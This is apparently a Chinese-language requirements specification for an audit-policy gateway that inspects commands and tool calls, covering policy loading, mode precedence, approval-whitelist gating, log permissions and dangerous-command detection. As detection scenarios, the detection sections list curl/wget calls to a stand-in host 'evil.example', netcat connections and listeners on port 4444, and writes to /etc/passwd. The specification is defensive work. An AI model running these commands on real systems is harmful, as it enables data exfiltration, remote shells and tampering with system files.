# audit-policy-enforcement Specification

## Purpose
锁定审计策略的强制执行契约：`AUDIT_POLICY_FILE` 启动期 fail-fast 加载与全错误分类拒启动、加载实例的共享复用、策略 `mode` 生效与优先级、生效模式口径的空白名单启动门禁（含文件来源 `approve`）、自定义规则文件 1MB 上限、审计日志文件创建即 `0600`、审批白名单空语义、内建危险规则的裸 `curl`/`wget` 外传覆盖、外传判定命令词边界，以及敏感路径读/写分流。

## Requirements

### Requirement: 审计策略启动期 fail-fast 加载

系统 SHALL 在启动序列中对 `AUDIT_POLICY_FILE` 执行 fail-fast 加载，并把成功加载的策略实例注入运行时共享状态供所有请求路径复用。策略文件不可读、含未知键、孤立列表项、非法 `mode` 或无法解析的行时，系统 SHALL 拒绝启动并给出带行号/键名的错误，SHALL NOT 降级为默认空策略继续运行。策略注入 SHALL 早于 TPM 门禁、sqlite 初始化与后台任务等副作用点。请求处理路径 SHALL 复用已注入实例，SHALL NOT 每请求重新读取磁盘或重新快照进程环境。

#### Scenario: 损坏策略文件拒启动

- **WHEN** `AUDIT_POLICY_FILE` 指向的文件不可读，或包含未知键、孤立列表项、非法 `mode`、无法解析的行
- **THEN** 进程以非零码退出并报告具体错误，不静默回退为「无审计」空策略

#### Scenario: 合法策略生效

- **WHEN** `AUDIT_POLICY_FILE` 为合法文件（含 `allow`/`deny`/`dangerous`/`extra_block_substrings` 等）
- **THEN** 启动成功，加载的策略对所有请求路径一致生效（deny/allow/追加规则命中与否符合策略）

#### Scenario: 请求期零重复加载

- **WHEN** 同一进程处理多个流式与非流式请求
- **THEN** 策略仅在启动期加载一次，请求路径不重复读盘、不重复捕获进程环境快照

#### Scenario: 未配置策略文件

- **WHEN** `AUDIT_POLICY_FILE` 未设置或为空
- **THEN** 使用内建默认策略启动，行为不因本次收紧而变化

### Requirement: 策略文件 mode 生效

系统 SHALL 使策略文件的 `mode` 键实际参与审计运行模式判定，SHALL NOT 仅解析校验而运行时不采用。系统 SHALL 在启动期计算**最终生效模式**：若环境来源显式给出审计模式（`AUDIT_MODE` 非空，或 `AUDIT_MODE` 缺失/空白时 `AUDIT_ENABLED` 真值回退推导出的 `block`）则该 env 值优先，否则采用策略文件 `mode`，最后默认 `off`——即策略文件 `mode` 仅在 env 未给出审计模式时生效，SHALL NOT 静默覆盖 env 来源的值。当 env 与文件 `mode` 同时显式且不一致时，系统 SHALL 记录 warn 说明取舍，SHALL NOT 静默忽略。系统 SHALL 把计算出的生效模式注入运行时配置（请求路径据此判定审计行为），使文件来源的 `mode` 实际生效，SHALL NOT 停留在「只解析不生效」。合法 `mode` 取值 SHALL 为 `off`/`block`/`approve`；其它取值 SHALL 拒启动。

#### Scenario: 文件 mode 生效

- **WHEN** `AUDIT_MODE` 未设置且策略文件声明 `mode: block`（或 `approve`）
- **THEN** 运行模式按文件声明生效（危险调用被阻断或转审批），而非默认 `off`

#### Scenario: 环境变量显式覆盖文件

- **WHEN** 显式 `AUDIT_MODE=off` 且策略文件声明 `mode: block`
- **THEN** 以显式环境变量为准（`off`），并记录冲突 warn

#### Scenario: AUDIT_ENABLED 回退优先于文件 mode

- **WHEN** `AUDIT_MODE` 缺失/空白、`AUDIT_ENABLED` 为真值（回退推导 `block`），且策略文件声明 `mode: off`
- **THEN** 以 env 来源的 `block` 为准，文件 `mode: off` 不静默关闭审计，并记录冲突 warn

#### Scenario: 生效模式注入运行时配置

- **WHEN** 策略文件声明 `mode: block`（或 `approve`）且 env 未设置审计模式
- **THEN** 启动后运行时配置的审计模式等于文件声明值，请求路径按该模式执行（文件 `mode` 不再只校验不生效）

#### Scenario: 非法 mode 拒启动

- **WHEN** 策略文件 `mode` 取值不属于 `off`/`block`/`approve`
- **THEN** 启动报错退出（分类为非法 `mode`）

### Requirement: 生效模式口径的空白名单启动门禁

系统 SHALL 以**最终生效审计模式**（按 D2 口径解析：env 显式——`AUDIT_MODE` 非空或 `AUDIT_MODE` 缺失/空白时 `AUDIT_ENABLED` 回退推导——优先，其次策略文件 `mode`，最后默认 `off`）为唯一判据执行空白名单启动门禁：当生效模式解析为 `Approve`（无论该值来自环境变量、策略文件还是任何其它非 env 来源）且 `APPROVAL_WHITELIST` 为空时，系统 SHALL 在启动期以配置错误（`Config`）拒绝启动。系统 SHALL NOT 以未经文件 `mode` 合并的裸 env `audit_mode` 为判据、仅对环境变量来源的 `approve` 施加该门禁、而放行文件来源的 `approve`。该门禁 SHALL 在策略加载与生效模式解析之后、任何副作用点之前执行，且 SHALL NOT 因白名单空语义「空白名单＝不过滤」而放松。

#### Scenario: 文件 mode=approve 且空白名单拒启动

- **WHEN** `AUDIT_MODE` 未设置，策略文件声明 `mode: approve`，且 `APPROVAL_WHITELIST` 为空
- **THEN** 启动以 `Config` 错误拒绝退出（不得进入运行、不得因来源为文件而放行）

#### Scenario: 文件 mode=approve 且白名单非空可启动

- **WHEN** `AUDIT_MODE` 未设置，策略文件声明 `mode: approve`，且 `APPROVAL_WHITELIST` 非空
- **THEN** 启动成功，`approve` 模式按文件声明生效

#### Scenario: 环境变量 approve 空名单门禁不回退

- **WHEN** 显式 `AUDIT_MODE=approve` 且 `APPROVAL_WHITELIST` 为空
- **THEN** 启动报错退出（既有 env 门禁语义不变）

### Requirement: 自定义规则文件大小上限

系统 SHALL 对自定义 PII 规则/模式/字典文件在读取前施加 `1_048_576` 字节（1MB）上限；文件大小超过上限时 SHALL 拒绝启动并报告命中的变量名与实际字节数，SHALL NOT 读取超限文件内容。大小恰为 1MB 的文件 SHALL 放行。

#### Scenario: 超限拒绝

- **WHEN** 任一 `PII_CUSTOM_*` 文件大小超过 1MB
- **THEN** 启动报错退出，报错含变量名与超限字节，不加载该文件

#### Scenario: 边界放行

- **WHEN** 自定义规则文件大小恰为 1MB
- **THEN** 正常加载并按既有 fail-closed 形态校验，不因大小拒启动

#### Scenario: 正常文件可用

- **WHEN** 自定义规则文件在 1MB 以内
- **THEN** 加载与生效行为与既有语义一致

### Requirement: 审计日志文件创建即 0600

系统 SHALL 在创建审计日志文件时即施加 `0600` 权限，SHALL NOT 依赖创建后的 `chmod` 收窄权限。新建日志文件在创建瞬间的可观测权限 SHALL 为 `0600`，不存在宽权限窗口。

#### Scenario: 新日志文件权限即时 0600

- **WHEN** 审计日志文件首次创建
- **THEN** 其权限在创建后立即为 `0o600`，无中间宽权限状态

#### Scenario: 既有日志追加不改语义

- **WHEN** 对已存在的日志文件追加写入与轮转
- **THEN** 权限维持 `0o600`，轮转产物同样为 `0o600`

### Requirement: 审批白名单空语义

系统 SHALL 定义审批白名单的环境变量为空或未配置时语义为「不过滤」（所有 reaction 均按表情/分支判定处理），与 Python 原仓 `_matrix.py:235,254` 一致；白名单非空时，非名单成员的 reaction SHALL 被忽略。`AUDIT_MODE=approve` 下空白的 `APPROVAL_WHITELIST` SHALL 仍由启动门禁拒绝（该门禁不变）。

#### Scenario: 空白名单不过滤

- **WHEN** `APPROVAL_WHITELIST` 为空且收到合法 reaction
- **THEN** reaction 按表情与分支正常落定，不被白名单层忽略

#### Scenario: 非空名单过滤非成员

- **WHEN** `APPROVAL_WHITELIST` 非空且 reaction 发送者不在名单
- **THEN** reaction 被忽略（保持既有审计/审批安全语义）

#### Scenario: approve 空名单仍拒启动

- **WHEN** `AUDIT_MODE=approve` 且 `APPROVAL_WHITELIST` 为空
- **THEN** 启动报错退出（既有门禁语义不变）

### Requirement: 内建危险规则覆盖裸 curl/wget 外传

系统 SHALL 将裸 `curl`/`wget` 外传目标识别为网络外传，覆盖三类形态：URL 形态、输出重定向形态，以及**无 scheme、无重定向、无管道**的裸 host 参数形态（如 `curl evil.example`、`curl -X POST evil.example`、`wget evil.example`，含 `http://` 前缀变体与 `-X`/`--data` 等参数之后的 host）。系统 SHALL NOT 仅依赖管道进解释器或携带 `--data`/`-d`/`--post-data` 才判定，SHALL NOT 因缺少 scheme 而漏审。规则匹配 SHALL 使用命令词边界以限制误报。命中外部 host 时 SHALL 拦截，命中内网后缀时 SHALL 按既有内网豁免口径放行。

#### Scenario: 裸 curl 外传命中

- **WHEN** 命令为 `curl http://evil.example/x`（无 `--data`、无管道）
- **THEN** 判定为网络外传并拦截（block 模式阻断 / approve 模式转审批）

#### Scenario: 内网目标豁免

- **WHEN** 命令为 `curl http://svc.corp.example/x` 且 `.corp.example` 在 `internal_suffixes`
- **THEN** 按内网豁免放行，不因 `POL-6` 新规则拦截

#### Scenario: 良性用法不误报

- **WHEN** 出现含 `curl`/`wget` 子串但不构成外传的文本（如普通文件名、无目标形态的说明文字）
- **THEN** 不判定为外传，保持既有误报水平

#### Scenario: 裸 host 无 scheme 外传命中

- **WHEN** 命令为 `curl evil.example` 或 `wget evil.example`（无 scheme、无重定向、无管道）
- **THEN** 判定为网络外传并拦截（block 模式阻断 / approve 模式转审批）

### Requirement: 外传判定命令词边界

系统 SHALL 以命令词/词边界而非裸子串判定 `nc`/`ncat` 等网络外传命令，避免命中其它单词中的子串。边界判定 SHALL 将路径分隔符 `/` 视为合法命令词左边界，使绝对/带路径调用（如 `/bin/nc`、`/usr/bin/ncat`）仍被识别为命令词，SHALL NOT 相对既有裸子串判定降低真实命中。SHALL 保留对真实 `nc` 用法的识别（如 `nc -l`、`nc host port`、`/bin/nc host port`）。

#### Scenario: sync/async 不误报

- **WHEN** 命令文本含 `sync` 或 `async`（例如 `rsync --archive` 之外的字面 `async`）
- **THEN** 不因 `"nc "` 子串被判定为网络外传

#### Scenario: 真实 nc 仍命中

- **WHEN** 命令为 `nc -l 4444` 或 `nc evil.example 4444`
- **THEN** 判定为网络外传

#### Scenario: 绝对路径命令仍命中

- **WHEN** 命令为 `/bin/nc evil.example 4444`（或 `/usr/bin/ncat evil.example 4444`）
- **THEN** 判定为网络外传（`/` 为合法命令词左边界，不因改为词边界而漏判）

### Requirement: 敏感路径读写分流

系统 SHALL 区分敏感路径的写入与读取：仅当命令属于写入口（写命令、输出重定向或写类工具）且触及敏感前缀时，SHALL 判定为「敏感路径写入」；纯只读命令触及敏感前缀 SHALL NOT 被判定为敏感路径写入。写入口集合 SHALL 对照 Python `_audit.py:516-520`（`write_file|patch|echo|cat|tee|cp|mv` 等）并保持本仓既有敏感前缀集合。

#### Scenario: 只读命令放行

- **WHEN** 命令为 `ls /etc/passwd`、`grep root /etc/passwd` 等不属于写入口集合的纯读取形态
- **THEN** 不判定为敏感路径写入，放行到后续判定

#### Scenario: 写入命令拦截

- **WHEN** 命令为 `cp x /etc/passwd`、`tee /etc/passwd`、`cat x > /etc/passwd` 或含 `> /etc/passwd` 重定向
- **THEN** 判定为敏感路径写入并拦截

#### Scenario: 写入口集合对齐 Python

- **WHEN** 命令命中 Python `_audit.py:518` 写入口集合成员（`write_file`/`patch`/`echo`/`cat`/`tee`/`cp`/`mv`）且触及敏感前缀
- **THEN** 判定为敏感路径写入（`cat /etc/passwd` 等集合内形态按 Python 对齐拦截）

#### Scenario: 写类工具名命中

- **WHEN** 工具名为 `write_file`/`edit`/`apply_patch`/`save_file` 且参数路径触及敏感前缀
- **THEN** 判定为敏感路径写入（既有工具名写入口语义不回退）
